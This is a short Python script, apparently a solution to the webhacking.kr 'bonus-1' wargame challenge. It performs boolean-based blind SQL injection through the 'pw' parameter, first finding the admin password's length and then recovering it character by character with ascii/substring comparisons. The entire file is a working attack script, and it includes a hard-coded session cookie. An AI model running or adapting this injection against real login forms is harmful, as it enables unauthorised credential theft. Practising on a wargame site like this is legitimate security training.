#!/usr/bin/python

import requests as req

url = "https://webhacking.kr/challenge/bonus-1/index.php"
cookies = {"PHPSESSID":"22h1kbhc6uk1mhisjb9f5tif6n"}
params = {"id":"admin"}
ref1 = "wrong password"
length = ""
pw = ""

for i in range(51):
    params["pw"] = "'or id='admin' and length(pw)={}-- ".format(i)
    response = req.get(url, cookies=cookies, params=params)
    if ref1 in response.text:
        length = i
        break

print("admin password length is {}".format(length))

for i in range(length+2):
    for j in range(33, 127):
        params["pw"] = "' or id='admin' and ascii(substring(pw, {}, 1))={}-- ".format(i, j)
        response = req.get(url, cookies=cookies, params=params)
        if ref1 in response.text:
            pw += chr(j)
            print(pw)
            break

print("admin password is : {}".format(pw))